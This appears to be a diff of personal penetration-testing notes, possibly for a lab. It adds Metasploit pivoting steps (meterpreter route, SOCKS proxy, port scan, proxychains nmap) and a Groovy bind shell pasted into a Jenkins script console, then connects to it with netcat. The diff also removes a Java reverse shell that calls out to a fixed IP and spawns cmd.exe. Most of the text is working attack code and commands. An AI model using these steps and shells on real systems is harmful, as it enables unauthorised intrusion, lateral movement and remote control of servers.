@@ -68,10 +68,43 @@ exploit
 ifconfig
 
 # Second network  : 192.78.79.2
+## Put meterpreter session in background and add route
+bg
+route add 192.78.79.0/24 1 (1 is session id)
 
+## Set up Socks proxy convert the meterpreter session to serve as a socks
+use auxiliary/server/socks_proxy
+set VERSION 4a
+set SRVPORT 9050
+run -j
 
+## Run port scan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS
+set RPORT
+set ....
+exploit
 
-String host=192.149.90.2;
-int port=8044;
-String cmd=”cmd.exe”;
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+## Run nmap scan
+proxychains nmap -sT -sV -Pn 192.78.79.3
+
+jenkins service is running on port 8080
+
+## Configure Socks4 proxy in browser to access jenkins dashboard via browser
+visit 192.78.79.3:8080
+
+## Go to script console and put following bind shell in console and hit run
+
+int port=5555;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
+Socket s = new java.net.ServerSocket(port).accept()
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+## Start netcat listener on port 5555
+proxychains nc -v 192.78.79.3 5555
+ls
+id
+ps aux
